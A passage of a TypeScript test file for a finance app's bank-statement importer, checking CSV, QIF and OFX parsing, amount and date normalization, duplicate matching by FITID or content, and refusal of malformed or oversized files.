    const text = 'Date,Description,Amount\n2026-09-01,Fine,-1\n2026-09-02,"Never closed,-2\n2026-09-03,Lost,-3\n';
    const r = ready(text, map({ date: 0, description: 1, amount: 2 }));
    expect(r.records.map((x) => x.description)).toEqual(['Fine']);
    expect(r.problems).toEqual([{ line: 3, reason: 'A quote opened on this line is never closed, so nothing from here on could be read.' }]);
    expect(readCsvTable('"Date,Description\n')).toEqual({ error: 'A quote opened on line 1 is never closed, so nothing could be read.' });
  });

  test('a line with a field past the last column is never read from shifted columns', () => {
    const r = ready('Date,Description,Amount\n2026-09-01,Coffee, Seattle,-4.50\n2026-09-02,Tea,-3.00\n', map({ date: 0, description: 1, amount: 2 }));
    expect(r.records.map((x) => x.description)).toEqual(['Tea']);
    expect(r.problems.map((p) => [p.line, p.reason])).toEqual([[2, 'This line has 4 fields, but there are 3 columns: a description may hold an unquoted ",".']]);
    // Every line ending in a separator is a file's habit, not a shift.
    expect(ready('Date,Description,Amount\n2026-09-01,A,-1,\n2026-09-02,B,-2,\n', map({ date: 0, description: 1, amount: 2 })).records).toHaveLength(2);
  });

  test('separators: tabs and vertical bars found, CR-only line ends, blank lines skipped, trailing separators', () => {
    expect(detectDelimiter('Date\tName\tAmount\n2026-09-01\tA, B\t-1\n')).toBe('\t');
    expect(detectDelimiter('Date|Name|Amount\n2026-09-01|A, B|-1\n')).toBe('|');
    const t = readCsvTable('Date,Name,Amount,\r2026-09-01,A,-1,\r\r2026-09-02,B,-2,\r') as CsvTable;
    expect(t.header).toEqual(['Date', 'Name', 'Amount']);
    expect(t.rows.map((r) => r.line)).toEqual([2, 4]);
    expect(splitCsv('a,"b ""c""" , d\n', ',').rows).toEqual([{ line: 1, cells: ['a', 'b "c" ', ' d'] }]);
  });

  test('not a table of transactions: too few columns, nothing at all', () => {
    expect(readCsvTable('Just one column\nvalue\n')).toEqual({ error: expect.stringContaining('needs at least a date, a description and an amount') });
    expect(readCsvTable('\n\n')).toEqual({ error: 'This file is empty.' });
    expect(readImport('', { options: {}, thisYear: YEAR })).toMatchObject({ status: 'error' });
  });

  test('a mapping is checked against the file: every column in it, each used once, one way of giving amounts', () => {
    const header = ['Date', 'Description', 'Amount', 'Debit', 'Credit'];
    expect(columnsProblem({ date: 0, description: 1, amount: 2 }, header)).toBeNull();
    expect(columnsProblem({ date: 0, description: 1, amount: 9 }, header)).toContain('isn’t in this file');
    expect(columnsProblem({ date: 0, description: 0, amount: 2 }, header)).toBe('Each column can only be used once.');
    expect(columnsProblem({ date: 0, description: 1, amount: 2, debit: 3 }, header)).toContain('not both');
    expect(columnsProblem({ date: 0, description: 1, debit: 3 }, header)).toBe('Choose both the money-out and the money-in column.');
    expect(columnsProblem({ date: 0, description: 1 }, header)).toBe('Choose the amount column.');
    expect(columnsProblem({ description: 1, amount: 2 } as never, header)).toBe('Choose the date column.');
    expect(columnsProblem({ date: 0, amount: 2 } as never, header)).toBe('Choose the description column.');
    const r = readImport('Date,Description,Amount\n2026-09-01,A,-1\n', { options: { csv: { columns: { date: 0, description: 1 } as never, sign: 'negative-out' } }, thisYear: YEAR });
    expect(r).toMatchObject({ status: 'mapping', problem: 'Choose the amount column.' });
  });

  test('a remembered mapping applies by column name to the next file from the same bank, and only when every column is there', () => {
    const header = ['Transaction Date', 'Posted Date', 'Description', 'Debit', 'Credit'];
    const named = namesOf({ date: 0, description: 2, debit: 3, credit: 4 }, header);
    expect(named).toEqual({ date: 'Transaction Date', description: 'Description', debit: 'Debit', credit: 'Credit' });
    expect(columnsFromNames(named, ['Credit', 'debit', ' DESCRIPTION ', 'Transaction Date'])).toEqual({ date: 3, description: 2, debit: 1, credit: 0 });
    expect(columnsFromNames(named, ['Transaction Date', 'Description', 'Amount'])).toBeNull();
  });

  test('a billion-row claim, and a file of nothing but separators and line breaks, are bounded by what is there', () => {
    const claim = 'Rows: 1000000000\nDate,Description,Amount\n2026-09-01,Only one,-1\n';
    expect(ready(claim, map({ date: 0, description: 1, amount: 2 })).records).toHaveLength(1);
    const started = performance.now();
    const junk = readCsvTable(',,,\n'.repeat(750_000));
    expect(performance.now() - started).toBeLessThan(3000);
    expect(junk).toEqual({ error: 'This file is empty.' });
  });

  test('more rows than one import takes: refused whole', () => {
    const text = 'Date,Description,Amount\n' + Array.from({ length: MAX_IMPORT_ROWS + 1 }, (_, i) => `2026-09-01,Row ${i},-1`).join('\n');
    expect(readImport(text, { options: map({ date: 0, description: 1, amount: 2 }), thisYear: YEAR })).toMatchObject({ status: 'error', error: expect.stringContaining('more than 10,000') });
    const fits = 'Date,Description,Amount\n' + Array.from({ length: MAX_IMPORT_ROWS }, (_, i) => `2026-09-01,Row ${i},-1`).join('\n');
    expect(ready(fits, map({ date: 0, description: 1, amount: 2 })).records).toHaveLength(MAX_IMPORT_ROWS);
  });
});

describe('QIF', () => {
  const text = fixture('checking.qif');

  test('a Quicken bank export: apostrophe dates, thousands, a transfer, a check, a split, U beside T, and the opening balance left out', () => {
    const r = ready(text);
    expect(r.format).toBe('qif');
    expect(r.read).toMatchObject({ date_order: 'mdy', decimal: '.' });
    expect(r.records.map((x) => [x.line, x.date, x.amount, x.description, x.category, x.note])).toEqual([
      [8, '2026-09-01', 4.5, 'SQ *BLUE BOTTLE COFFEE', 'Dining:Coffee', 'POS PURCHASE'],
      [14, '2026-09-02', -2450, 'ACME CORP PAYROLL', 'Salary', null],
      [19, '2026-09-03', 500, 'Transfer to savings', 'transfer out', null],
      [24, '2026-09-10', 1450, 'Pacific Property Mgmt', 'Housing:Rent', null],
      [30, '2026-09-12', 61.37, 'AT&T Wireless', 'Utilities:Phone', null],
      [35, '2026-09-15', 210, 'Costco', null, null],
      [44, '2026-09-20', 30.25, 'Shell Oil 57442', 'Auto:Fuel', 'Gas'],
    ]);
    expect(r.problems).toEqual([
      { line: 2, reason: 'This is Quicken’s opening balance for the account, not a transaction, so it isn’t imported.', raw: ["D8/31'26", 'T1,000.00', 'CX', 'POpening Balance', 'L[Checking]'] },
    ]);
    // The split is kept whole in the raw record.
    expect(r.records[5].raw).toEqual(["D9/15'26", 'T-210.00', 'PCostco', 'SGroceries', 'EFood', '$-150.00', 'SHousehold', '$-60.00']);
  });

  test('several accounts in one file ask which; a card section reads charges as money out', () => {
    const multi = [
      '!Account', 'NEveryday Checking', 'TBank', '^', '!Type:Bank', 'D09/01/2026', 'T-1.00', 'PA', '^',
      '!Account', 'NTravel Card', 'TCCard', '^', '!Type:CCard', 'D09/13/2026', 'T-25.00', 'PHotel', '^', 'D09/14/2026', 'T100.00', 'PPayment',
    ].join('\n');
    const asked = readImport(multi, { options: {}, thisYear: YEAR });
    expect(asked.status).toBe('statement');
    if (asked.status === 'statement') expect(asked.statements.map((s) => [s.label, s.kind, s.count])).toEqual([['Everyday Checking', 'bank', 1], ['Travel Card', 'creditcard', 2]]);
    // The last record needs no closing "^".
    expect(ready(multi, { statement: 1 }).records.map((x) => [x.description, x.amount, x.date])).toEqual([
      ['Hotel', 25, '2026-09-13'],
      ['Payment', -100, '2026-09-14'],
    ]);
  });

  test('dates every one of which fits both orders ask; categories, classes and investments are passed over', () => {
    const text2 = ['!Type:Cat', 'NFood', 'E', '^', '!Type:Bank', "D1/2'26", 'T-1.00', 'PA', 'LFood/Business', '^', "D3/4'26", 'T-2.00', 'MOnly a memo', '^', '!Type:Invst', 'D1/5/26', 'NBuy', '^'].join('\n');
    expect(readImport(text2, { options: {}, thisYear: YEAR })).toMatchObject({ status: 'date_order', detection: { ambiguous: true } });
    const r = ready(text2, { date_order: 'dmy' });
    expect(r.records.map((x) => [x.date, x.description, x.category])).toEqual([
      ['2026-02-01', 'A', 'Food'],
      ['2026-04-03', 'Only a memo', null],
    ]);
    expect(r.problems.map((p) => p.reason)).toEqual(['An investment account’s transactions start here; they can’t be imported, so they were skipped.']);
    expect(parseQif('!Type:Invst\nD1/5/26\n^\n').error).toContain('only investment transactions');
    expect(parseQif('!Type:Cat\nNFood\n^\n').error).toContain('no bank, cash or credit card transactions');
  });

  test('records that can’t be read say why; a long line is refused', () => {
    const bad = ['!Type:Bank', 'T-1.00', 'PNo date', '^', 'D9/1/26', 'PNo amount', '^', 'D9/1/26', 'T-1.00', '^', `D9/1/26`, 'T-1.00', `P${'z'.repeat(MAX_FIELD_CHARS + 5)}`, '^'].join('\n');
    const section = parseQif(bad).sections[0];
    expect(qifRecords(section, { date_order: 'mdy', decimal: '.' }, YEAR).problems.map((p) => [p.line, p.reason])).toEqual([
      [2, 'It has no date.'],
      [5, 'It has no amount.'],
      [8, 'It has no payee.'],
      [11, `A line of this transaction is over ${MAX_FIELD_CHARS.toLocaleString('en-US')} characters long, so it can’t be read.`],
    ]);
  });
});

describe('normalize: each record as a manual row, by the rules a typed one meets', () => {
  const rec = (over: Partial<RawRecord> = {}): RawRecord => ({ source: 'csv', date: '2026-09-01', amount: 4.5, description: 'Coffee', raw: [], line: 2, ...over });

  test('dates: real, from 1900, no later than tomorrow', () => {
    const r = rows([rec({ date: '2026-10-10' }), rec({ date: '2026-10-11' }), rec({ date: '1899-12-31' }), rec({ date: '2026-02-30' })]);
    expect(r.rows.map((x) => x.row.date)).toEqual(['2026-10-10']);
    expect(r.problems.map((p) => p.reason)).toEqual(['It is dated 2026-10-11, in the future.', 'It is dated 1899-12-31, before 1900.', 'Its date isn’t a real day.']);
  });

  test('amounts: not zero, within bounds, whole minor units of their own currency', () => {
    const r = rows([
      rec({ amount: 0 }),
      rec({ amount: 2e12 }),
      rec({ amount: 12.345 }),
      rec({ amount: 1234, currency: 'JPY' }),
      rec({ amount: 12.5, currency: 'JPY' }),
      rec({ amount: 1.234, currency: 'KWD' }),
      rec({ amount: 5, currency: 'XYZ' }),
    ]);
    expect(r.rows.map((x) => [x.row.amount, x.row.currency])).toEqual([
      [1234, 'JPY'],
      [1.234, 'KWD'],
    ]);
    expect(r.problems.map((p) => p.reason)).toEqual([
      'Its amount is zero.',
      'Its amount is too large.',
      'An amount in USD has at most 2 decimal places, and this one has more.',
      'An amount in JPY is a whole number, and this one has more.',
      'Its currency (XYZ) isn’t one Nya knows.',
    ]);
  });

  test('text: control characters and invisible reordering marks gone, spaces single, long text shortened and flagged', () => {
    const long = 'CARD PURCHASE WITH PIN 09/01 '.repeat(8);
    const r = rows([
      rec({ description: 'Coffee\u0000\u202e shop\u200b\tSEATTLE', category: '  Food AND Drink ', note: 'line one\r\nline two' }),
      rec({ description: long, note: 'n'.repeat(600) }),
      rec({ description: '   ' }),
      rec({ description: '😀'.repeat(60) }),
    ]);
    expect(r.rows[0].row).toMatchObject({ name: 'Coffee shop SEATTLE', category: 'food and drink', note: 'line one line two' });
    expect(r.rows[0].shortened).toBe(false);
    expect(r.rows[1].row.name).toHaveLength(100);
    expect(r.rows[1].row.note).toHaveLength(500);
    expect(r.rows[1].shortened).toBe(true);
    // Never a character cut in two.
    expect(r.rows[2].row.name.length).toBeLessThanOrEqual(100);
    expect(r.rows[2].row.name.endsWith('😀')).toBe(true);
    expect(r.problems.map((p) => p.reason)).toEqual(['It has no description.']);
  });

  test('where it came from: an OFX row keeps its FITID; a CSV or QIF row the content key it was imported with', () => {
    const [ofx, bare, csv, qif] = rows([
      rec({ source: 'ofx', source_id: 'FIT-1' }),
      rec({ source: 'ofx' }),
      rec({ description: 'SQ *Coffee   Shop' }),
      rec({ source: 'qif', amount: -12, currency: 'EUR' }),
    ]).rows.map((x) => x.row);
    expect(ofx).toMatchObject({ source: 'import:ofx', source_id: 'FIT-1' });
    expect(bare).toMatchObject({ source: 'import:ofx', source_id: null });
    expect(csv).toMatchObject({ source: 'import:csv', source_id: '2026-09-01|USD|450|sq coffee shop' });
    expect(qif).toMatchObject({ source: 'import:qif', source_id: '2026-09-01|EUR|-1200|coffee' });
    expect(normalizeDescription('ÉCOLE  Café-Shop #12')).toBe('école café shop 12');
    expect(contentKey({ date: '2026-09-01', amount: 1234, currency: 'JPY', name: 'X' })).toBe('2026-09-01|JPY|1234|x');
  });
});

describe('match: what an account already has', () => {
  let n = 0;
  const stored = (over: Partial<StoredRow> = {}): StoredRow => ({ id: `manual-txn:${++n}`, date: '2026-09-03', amount: 4.5, currency: 'USD', name: 'SQ *BLUE BOTTLE COFFEE', source: 'manual', source_id: null, ...over });
  const ofxRows = () => rows(ready(fixture('checking-ofx102.ofx')).records).rows.map((x) => x.row);
  const csvRows = () =>
    rows(ready(fixture('card-debit-credit.csv'), { csv: { columns: { date: 0, description: 3, debit: 5, credit: 6 }, sign: 'negative-out' } }).records).rows.map((x) => x.row);
  const asStored = (r: { date: string; amount: number; currency: string; name: string; source: string; source_id: string | null }) => stored({ ...r });

  test('the same OFX imported again adds nothing: every row found by FITID, the repeated one still a repeat', () => {
    const first = ofxRows();
    const outcomes = matchRows(first, []);
    expect(countOutcomes(outcomes)).toEqual({ new: 8, present: 0, repeated: 1, conflict: 0 });
    const kept = first.filter((_, i) => outcomes[i].outcome === 'new').map(asStored);
    const again = matchRows(ofxRows(), kept);
    expect(countOutcomes(again)).toEqual({ new: 0, present: 8, repeated: 1, conflict: 0 });
    expect(again.every((o) => o.outcome !== 'present' || o.by === 'id')).toBe(true);
  });

  test('found by FITID even after the row was edited', () => {
    const [pay] = ofxRows();
    const edited = stored({ ...pay, name: 'Salary', amount: -2400, date: '2026-09-02' });
    expect(matchRows([pay], [edited])).toEqual([{ outcome: 'present', row_id: edited.id, by: 'id' }]);
  });

  test('two identical coffees on one day are two rows; a row typed by hand is one of them', () => {
    const coffees = ofxRows().filter((r) => r.name === 'SQ *BLUE BOTTLE COFFEE');
    expect(coffees).toHaveLength(2);
    expect(countOutcomes(matchRows(coffees, []))).toEqual({ new: 2, present: 0, repeated: 0, conflict: 0 });
    // One typed by hand already: that one is found by content, the other is new.
    const typed = stored();
    expect(matchRows(coffees, [typed])).toEqual([{ outcome: 'present', row_id: typed.id, by: 'content' }, { outcome: 'new' }]);
  });

  test('a stored row matched by its own FITID is never taken for another row of the file, however alike', () => {
    const [a, b] = ofxRows().filter((r) => r.name === 'SQ *BLUE BOTTLE COFFEE');
    const kept = asStored(a);
    expect(matchRows([a, b], [kept])).toEqual([{ outcome: 'present', row_id: kept.id, by: 'id' }, { outcome: 'new' }]);
    // Alone, b is the same coffee under a new FITID (a bank that renumbers):
    // the stored row is it, matched by what it says.
    expect(matchRows([b], [kept])).toEqual([{ outcome: 'present', row_id: kept.id, by: 'content' }]);
  });

  test('a CSV imported again reports what it skipped; identical rows match one each; an edited row is still known', () => {
    const first = csvRows();
    const stored1 = first.map(asStored);
    expect(countOutcomes(matchRows(csvRows(), stored1))).toEqual({ new: 0, present: 11, repeated: 0, conflict: 0 });
    // One of the two coffees stored: the other is new.
    const oneCoffee = stored1.filter((r, i) => i !== 4);
    expect(matchRows(csvRows(), oneCoffee)[4]).toEqual({ outcome: 'new' });
    // Renamed and recategorized since: found by the key it was imported with.
    const renamed = stored1.map((r) => ({ ...r, name: 'Something else' }));
    expect(countOutcomes(matchRows(csvRows(), renamed))).toEqual({ new: 0, present: 11, repeated: 0, conflict: 0 });
  });

  test('another currency or another day is another transaction', () => {
    const [coffee] = csvRows().filter((r) => r.name.startsWith('BLUE BOTTLE'));
    expect(matchRows([coffee], [stored({ date: coffee.date, name: coffee.name, amount: coffee.amount, currency: 'EUR' })])).toEqual([{ outcome: 'new' }]);
    expect(matchRows([coffee], [stored({ date: '2026-09-23', name: coffee.name, amount: coffee.amount })])).toEqual([{ outcome: 'new' }]);
    expect(matchRows([coffee], [stored({ date: coffee.date, name: 'blue  bottle-coffee seattle WA', amount: coffee.amount })])[0]).toMatchObject({ outcome: 'present', by: 'content' });
  });
});

// ---- What the review found, as tests (scratchpad probes turned into these) ----

describe('OFX that leaves its transactions unended', () => {
  const head =
    'OFXHEADER:100\nDATA:OFXSGML\nVERSION:102\n\n<OFX><BANKMSGSRSV1><STMTTRNRS><STMTRS><CURDEF>USD<BANKACCTFROM><BANKID>1<ACCTID>12345678<ACCTTYPE>CHECKING</BANKACCTFROM><BANKTRANLIST><DTSTART>20260901<DTEND>20260930\n';
  const tail = '</BANKTRANLIST><LEDGERBAL><BALAMT>100.00<DTASOF>20260930</LEDGERBAL></STMTRS></STMTTRNRS></BANKMSGSRSV1></OFX>';
  const trn = (i: number, close: boolean) =>
    `<STMTTRN><TRNTYPE>DEBIT<DTPOSTED>202609${String((i % 28) + 1).padStart(2, '0')}<TRNAMT>-${i}.00<FITID>F${i}<NAME>SHOP ${i}${close ? '</STMTTRN>' : ''}\n`;

  test('forty transactions without their end tags: all forty read, and the preview is told', () => {
    const r = ready(head + Array.from({ length: 40 }, (_, i) => trn(i + 1, false)).join('') + tail);
    expect(r.records.map((x) => x.source_id)).toEqual(Array.from({ length: 40 }, (_, i) => `F${i + 1}`));
    expect(r.records[39]).toMatchObject({ amount: 40, description: 'SHOP 40' });
    expect(r.problems).toEqual([]);
    expect(r.statement).toMatchObject({ count: 40, ledger: { amount: 100, as_of: '2026-09-30' } });
    expect(r.read.repairs).toEqual(['40 transactions in this file have no end tag (</STMTTRN>), so each was read up to the next one. Check the rows below.']);
  });

  test('one end tag missing among six: all six read, that one said', () => {
    const r = ready(head + [1, 2, 3, 4, 5, 6].map((i) => trn(i, i !== 3)).join('') + tail);
    expect(r.records.map((x) => x.description)).toEqual(['SHOP 1', 'SHOP 2', 'SHOP 3', 'SHOP 4', 'SHOP 5', 'SHOP 6']);
    expect(r.read.repairs).toEqual(['One transaction in this file has no end tag (</STMTTRN>), so it was read up to the next one. Check the rows below.']);
  });

  test('the closing tags that are there are enough: tidy files need no repair', () => {
    expect(ready(head + [1, 2, 3].map((i) => trn(i, true)).join('') + tail).read.repairs).toEqual([]);
    expect(ready(fixture('checking-ofx102.ofx')).read.repairs).toEqual([]);
    expect(ready(fixture('card-ofx220.ofx')).read.repairs).toEqual([]);
    expect(ready(fixture('two-accounts.qfx'), { statement: 0 }).read.repairs).toEqual([]);
  });

  test('other parts left unended, and end tags with nothing to end, are said too', () => {
    const r = ready(head + trn(1, true) + '</STMTTRN>' + trn(2, true) + '</BANKTRANLIST><LEDGERBAL><BALAMT>100.00<DTASOF>20260930</STMTRS></STMTTRNRS></BANKMSGSRSV1></OFX>');
    expect(r.records).toHaveLength(2);
    expect(r.statement?.ledger).toEqual({ amount: 100, as_of: '2026-09-30' });
    expect(r.read.repairs).toEqual([
      'This file leaves a part without an end tag (LEDGERBAL), so it was read as ending where the next part starts or the file ends.',
      'An end tag in this file (STMTTRN) had nothing to end, and was skipped.',
    ]);
  });

  test('a transaction the file opens but that can’t be built into one is counted, never lost without a word', () => {
    const r = ready(head + trn(1, true) + '<STMTTRN></STMTTRN>\n' + trn(2, true) + tail);
    expect(r.records.map((x) => x.source_id)).toEqual(['F1', 'F2']);
    expect(r.problems).toEqual([{ line: 5, reason: 'This statement lists 3 transactions, and one of them can’t be read: the file is damaged there.' }]);
  });
});

describe('what the bank’s own transaction type says', () => {
  const stmt = (kind: 'bank' | 'card', trns: [string, string, string][]) => {
    const list = trns.map(([type, amount, name], i) => `<STMTTRN><TRNTYPE>${type}<DTPOSTED>2026100${(i % 8) + 1}<TRNAMT>${amount}<FITID>T${i}<NAME>${name}</STMTTRN>`).join('\n');
    return kind === 'bank'
      ? `<OFX><BANKMSGSRSV1><STMTTRNRS><STMTRS><CURDEF>USD<BANKACCTFROM><BANKID>1<ACCTID>123456789<ACCTTYPE>CHECKING</BANKACCTFROM><BANKTRANLIST>${list}</BANKTRANLIST></STMTRS></STMTTRNRS></BANKMSGSRSV1></OFX>`
      : `<OFX><CREDITCARDMSGSRSV1><CCSTMTTRNRS><CCSTMTRS><CURDEF>USD<CCACCTFROM><ACCTID>4111111111111111</CCACCTFROM><BANKTRANLIST>${list}</BANKTRANLIST></CCSTMTRS></CCSTMTTRNRS></CREDITCARDMSGSRSV1></OFX>`;
  };
  const account = { account_id: 'manual_a-1', name: 'Checking', institution_name: 'CU', type: 'depository', subtype: 'checking', balance: 0, updated_at: '2026-10-01T00:00:00.000Z' } as const;
  /** The rows as the Activity tab and the Plan get them, through the book. */
  const shown = (text: string) =>
    rows(ready(text).records).rows.map(({ row }, i) => {
      const stored: ManualTxn = { id: `manual-txn:k${i}`, account_id: account.account_id, ...row, created_at: '2026-10-09T00:00:00.000Z', updated_at: '2026-10-09T00:00:00.000Z' };
      return manualRowForDisplay(account as any, stored);
    });

  test('transfers, ATM, fees and a card’s payment carry what the spending rules read; everything else no category', () => {
    const bank = shown(
      stmt('bank', [
        ['DEBIT', '-4.50', 'COFFEE'],
        ['CREDIT', '1000.00', 'PAYROLL'],
        ['XFER', '-500.00', 'TRANSFER TO SAVINGS'],
        ['XFER', '250.00', 'TRANSFER FROM SAVINGS'],
        ['ATM', '-60.00', 'ATM WITHDRAWAL'],
        ['FEE', '-3.00', 'ATM FEE'],
        ['SRVCHG', '-12.00', 'MONTHLY SERVICE CHARGE'],
        ['PAYMENT', '-1500.00', 'CHASE CARD PAYMENT'],
      ])
    );
    expect(bank.map((t) => [t.name, t.amount, t.category, t.transaction_code])).toEqual([
      ['COFFEE', 4.5, null, null],
      ['PAYROLL', -1000, null, null],
      ['TRANSFER TO SAVINGS', 500, 'transfer out', null],
      ['TRANSFER FROM SAVINGS', -250, 'transfer in', null],
      ['ATM WITHDRAWAL', 60, 'transfer out', 'atm'],
      ['ATM FEE', 3, 'bank fees', null],
      ['MONTHLY SERVICE CHARGE', 12, 'bank fees', null],
      // From a bank account, a payment may be any bill: spending, as it was.
      ['CHASE CARD PAYMENT', 1500, null, null],
    ]);
    // In the Activity tab's totals: transfers and cash out, fees and the rest in.
    expect(bank.map((t) => countsInTotals(t, 'USD'))).toEqual([true, true, false, false, false, true, true, true]);
    // In the Plan: the cash taken out is spent, the transfers are not.
    expect(bank.map((t) => planFlow(t as any))).toEqual(['spending', 'income', 'transfer', 'transfer', 'cash', 'spending', 'spending', 'spending']);

    const card = shown(
      stmt('card', [
        ['DEBIT', '-42.10', 'GROCERY'],
        ['CREDIT', '12.00', 'REFUND'],
        ['PAYMENT', '1500.00', 'PAYMENT THANK YOU'],
      ])
    );
    expect(card.map((t) => [t.amount, t.category])).toEqual([
      [42.1, null],
      [-12, null],
      [-1500, 'loan payments'],
    ]);
    // A card's payment is never income: not in money in, not in the Plan's.
    expect(countsInTotals(card[2], 'USD')).toBe(false);
    expect(planFlow(card[2] as any)).toBe('transfer');
  });

  test('which way a transfer goes is the amount’s, flipped or not', () => {
    expect(bankType('XFER', 'bank', 10)).toEqual({ category: 'transfer out', transaction_code: null });
    expect(bankType('XFER', 'bank', -10)).toEqual({ category: 'transfer in', transaction_code: null });
    expect(bankType('ATM', 'creditcard', 10)).toEqual({ category: 'transfer out', transaction_code: 'atm' });
    expect(bankType('PAYMENT', 'bank', -10)).toBeNull();
    for (const type of ['DEBIT', 'CREDIT', 'POS', 'CHECK', 'INT', 'DIV', 'DEP', 'DIRECTDEP', 'DIRECTDEBIT', 'REPEATPMT', 'OTHER', null]) expect(bankType(type, 'bank', 10)).toBeNull();
    const flipped = rows(ready(stmt('bank', [['XFER', '500.00', 'TO SAVINGS']]), { flip: true }).records).rows[0].row;
    expect(flipped).toMatchObject({ amount: 500, category: 'transfer out' });
  });
});

describe('files built to be large in the wrong way', () => {
  const MB3 = 3 * 1024 * 1024;

  test('a CSV header of a million and a half columns is refused at once, before any column list is built', () => {
    let wide = '';
    while (wide.length < MB3 - 64) wide += 'a,';
    wide += '\n';
    const started = performance.now();
    expect(readImport(wide, { options: {}, thisYear: YEAR })).toEqual({
      status: 'error',
      format: 'csv',
      error: `Line 1 of this file has more than ${MAX_CSV_COLUMNS} fields, more than a bank’s export has, so it can’t be read as a table.`,
    });
    expect(performance.now() - started).toBeLessThan(500);
    // A data line as wide is refused the same way; a table as wide as any
    // bank's reads.
    const header = Array.from({ length: MAX_CSV_COLUMNS }, (_, i) => (i === 0 ? 'Date' : i === 1 ? 'Description' : i === 2 ? 'Amount' : `Extra ${i}`)).join(',');
    const row = ['2026-09-01', 'Shop', '-1.00', ...Array.from({ length: MAX_CSV_COLUMNS - 3 }, () => 'x')].join(',');
    const table = readCsvTable(`${header}\n${row}\n`);
    expect('error' in table ? table.error : table.header.length).toBe(MAX_CSV_COLUMNS);
    expect(readCsvTable(`${header}\n${row}\n${row},${'y,'.repeat(5)}\n`)).toEqual({
      error: `Line 3 of this file has more than ${MAX_CSV_COLUMNS} fields, more than a bank’s export has, so it can’t be read as a table.`,
    });
    // A separator that would split a line too wide doesn't win over one
    // that splits the file into a table.
    expect(detectDelimiter(`Date;Description;Amount\n2026-09-01;${'a,'.repeat(300)};-1\n2026-09-02;b;-2\n`)).toBe(';');
  });

  test('a QIF file of 286,000 accounts is refused at the one past the limit', () => {
    let many = '';
    while (many.length < MB3 - 16) many += '!Type:Bank\n';
    const started = performance.now();
    expect(readImport(many, { options: {}, thisYear: YEAR })).toEqual({
      status: 'error',
      format: 'qif',
      error: `This file holds more than ${MAX_STATEMENTS} accounts, more than one import can choose from. Export one account at a time.`,
    });
    expect(performance.now() - started).toBeLessThan(1000);
    const fifty = Array.from({ length: MAX_STATEMENTS }, (_, i) => `!Account\nNAccount ${i}\nTBank\n^\n!Type:Bank\nD09/01/2026\nT-1.00\nPA\n^`).join('\n');
    const asked = readImport(fifty, { options: {}, thisYear: YEAR });
    expect(asked.status === 'statement' ? asked.statements.length : asked.status).toBe(MAX_STATEMENTS);
  });

  test('an OFX file of thousands of statements is refused; fifty are asked about', () => {
    const one = '<STMTRS><CURDEF>USD<BANKTRANLIST><STMTTRN><DTPOSTED>20261001<TRNAMT>-1<FITID>1<NAME>a</STMTTRN></BANKTRANLIST></STMTRS>';
    let many = '<OFX><BANKMSGSRSV1><STMTTRNRS>';
    while (many.length < MB3 - one.length) many += one;
    const started = performance.now();
    expect(readImport(many, { options: {}, thisYear: YEAR })).toEqual({
      status: 'error',
      format: 'ofx',
      error: `This file holds more than ${MAX_STATEMENTS} statements, more than one import can choose from. Export one account at a time.`,
    });
    expect(performance.now() - started).toBeLessThan(2000);
    const fifty = `<OFX><BANKMSGSRSV1><STMTTRNRS>${one.repeat(MAX_STATEMENTS)}`;
    const asked = readImport(fifty, { options: {}, thisYear: YEAR });
    expect(asked.status === 'statement' ? asked.statements.length : asked.status).toBe(MAX_STATEMENTS);
  });

  test('a question stays small: column names and the first rows cut short, and without control characters', () => {
    const cell = `x\u0001‮${'y'.repeat(5_000)}`;
    const header = Array.from({ length: MAX_CSV_COLUMNS }, (_, i) => `"${'H'.repeat(900)}${i}"`).join(',');
    const row = Array.from({ length: MAX_CSV_COLUMNS }, () => `"${cell.slice(0, 999)}"`).join(',');
    const text = `${header}\n${Array.from({ length: 20 }, () => row).join('\n')}\n`;
    const asked = readImport(text, { options: {}, thisYear: YEAR });
    if (asked.status !== 'mapping') throw new Error(asked.status);
    expect(asked.table.header.every((h) => h.length <= 100)).toBe(true);
    expect(asked.table.sample).toHaveLength(8);
    expect(asked.table.sample.every((r) => r.cells.every((c) => c.length <= 80 && !/[\u0000-\u001f‮]/.test(c)))).toBe(true);
    expect(JSON.stringify(asked).length).toBeLessThan(200_000);
  });
});

describe('the order of dates: the file’s own dates win', () => {
  const qif = '!Type:Bank\nD13/01/2026\nT-4.50\nPCOFFEE\n^\nD05/02/2026\nT-20.00\nPGROCER\n^\nD03/04/2026\nT-9.99\nPNETFLIX\n^\n';
  const csv = 'Date,Description,Amount\n13/01/2026,COFFEE,-4.50\n05/02/2026,GROCER,-20.00\n03/04/2026,NETFLIX,-9.99\n';
  const csvMapping = { csv: { columns: { date: 0, description: 1, amount: 2 }, sign: 'negative-out' as const } };
  const days = [
    ['COFFEE', '2026-01-13'],
    ['GROCER', '2026-02-05'],
    ['NETFLIX', '2026-04-03'],
  ];

  test('an order remembered from an earlier file that these dates contradict is set aside: every row on its own day', () => {
    for (const date_order of [undefined, 'mdy', 'dmy'] as const) {
      for (const [text, base] of [
        [qif, {}],
        [csv, csvMapping],
      ] as const) {
        const r = ready(text, { ...base, ...(date_order ? { date_order } : {}) });
        expect(r.records.map((x) => [x.description, x.date])).toEqual(days);
        expect(r.problems).toEqual([]);
        expect(r.read).toMatchObject({ date_order: 'dmy', order_open: false });
      }
    }
  });

  test('a remembered order stands only for dates that all fit both, and the answer says it is the person’s to change', () => {
    const open = '!Type:Bank\nD05/02/2026\nT-20.00\nPGROCER\n^\nD03/04/2026\nT-9.99\nPNETFLIX\n^\n';
    expect(readImport(open, { options: {}, thisYear: YEAR }).status).toBe('date_order');
    expect(ready(open, { date_order: 'mdy' })).toMatchObject({ read: { date_order: 'mdy', order_open: true }, records: [{ date: '2026-05-02' }, { date: '2026-03-04' }] });
    expect(ready(open, { date_order: 'dmy' })).toMatchObject({ read: { date_order: 'dmy', order_open: true }, records: [{ date: '2026-02-05' }, { date: '2026-04-03' }] });
  });

  test('dates that contradict each other always need the person’s answer', () => {
    const mixed = '!Type:Bank\nD13/01/2026\nT-4.50\nPCOFFEE\n^\nD01/13/2026\nT-20.00\nPGROCER\n^\n';
    expect(readImport(mixed, { options: {}, thisYear: YEAR })).toMatchObject({ status: 'date_order', detection: { mixed: true } });
    const r = ready(mixed, { date_order: 'mdy' });
    expect(r.read).toMatchObject({ date_order: 'mdy', order_open: true });
    expect(r.records.map((x) => x.date)).toEqual(['2026-01-13']);
    expect(r.problems.map((p) => p.reason)).toEqual(['Its date (13/01/2026) can’t be read as month/day/year (US).']);
  });
});

describe('a FITID is not trusted blindly', () => {
  const ofxOf = (list: [string, string, number, string][]) =>
    `<OFX><BANKMSGSRSV1><STMTTRNRS><STMTRS><CURDEF>USD<BANKTRANLIST>${list
